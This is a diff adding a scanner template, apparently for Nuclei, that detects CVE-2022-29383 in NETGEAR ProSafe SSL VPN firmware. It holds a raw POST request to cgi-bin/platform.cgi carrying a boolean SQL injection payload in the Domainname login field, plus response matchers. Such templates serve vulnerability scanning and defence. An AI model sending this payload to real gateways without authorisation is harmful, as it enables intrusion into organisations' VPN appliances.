@@ -1,0 +1,35 @@
+id: CVE-2022-29383
+
+info:
+  name: NETGEAR ProSafe SSL VPN firmware platform.cgi Boolean SQLi
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    NETGEAR ProSafe SSL VPN firmware FVS336Gv2 and FVS336Gv3 contain a SQL injection vulnerability via USERDBDomains.Domainname at cgi-bin/platform.cgi.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29383
+    - https://github.com/badboycxcc/Netgear-ssl-vpn-20211222-CVE-2022-29383
+    - https://www.netgear.com/about/security/
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202205-3298
+  classification:
+    cve-id: CVE-2022-29383
+    cvss-score: 7.5
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  tags: sql-injection
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/platform.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        thispage=index.htm&USERDBUsers.UserName=&USERDBUsers.Password=&button.login.USERDBUsers.router_status=Login&Login.userAgent=Mozilla&USERDBDomains.Domainname=geardomain'and+1%3d(case+when(1=1)+then+1+else+0+end)--+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "User Login Failed for SSLVPN User"
+      - type: word
+        words:
+          - "User authentication Failed. Use the correct SSL portal URL to login"
